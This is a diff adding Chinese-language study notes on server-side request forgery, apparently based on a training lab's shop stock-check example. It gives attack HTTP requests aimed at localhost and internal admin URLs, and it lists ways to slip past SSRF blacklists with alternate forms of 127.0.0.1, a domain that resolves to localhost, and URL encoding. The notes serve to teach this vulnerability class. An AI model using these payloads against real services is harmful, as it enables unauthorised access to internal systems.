@@ -2,3 +2,45 @@
 全称Server-side request forgery(SSRF)
 这种漏洞可以迫使一个合法服务主动向任意攻击者指定的domain/URL发出HTTP请求，包括该服务自身。可以以此掩盖攻击者真实身份，也能用这种攻击绕过可能的认证过程执行任意命令。
 
+攻击场景A：
+某个网购服务在提供库存查询服务时使用REST APIs去访问本网站内部的API URL。此时可以将API URL改为其它的URL，例如admin。这样做的目的是使网购服务自己去访问自己的admin url，以此绕开权限验证。
+
+正常访问：
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://stock.weliketoshop.net:8080/product/stock/check%3FproductId%3D6%26storeId%3D1
+
+攻击访问：
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://localhost/admin
+
+网站设计成这样可能是因为：
+1. 访问控制是在一个单独模块中实现的，而且该模块只在应用服务前端实现，应用服务内部并没有访问控制。
+2. 灾备需要。这样在丢失账户的紧急情况下，管理员可以直接访问应用来执行抢救。
+3. 管理界面在另外一个端口上，普通用户不能直接访问。
+
+攻击场景B：
+存在服务集群，其中有对外的服务，可以通过这种访问模式转而访问不对外公开的内部服务。这个需要了解网络结构。
+
+攻击访问：
+POST /product/stock HTTP/1.0
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 118
+
+stockApi=http://192.168.0.68/admin
+
+攻击场景C：
+绕过SSRF黑名单防御。有些服务可能有简单的黑名单防御措施，例如不允许使用127.0.0.1或者localhost来回访本机，或者不允许访问某些特定URL。
+1.可以使用其他的IP形态，例如2130706433, 017700000001或者127.1。
+2.注册一个自己的域名并解析成127.0.0.1
+3.用特定编码混淆所需访问的URL。
+
+这些也是通用的绕过黑名单的方式，简单说就是改变形态从其他维度使黑名单失效。
+
+攻击场景D：
+绕过SSRF白名单防御。
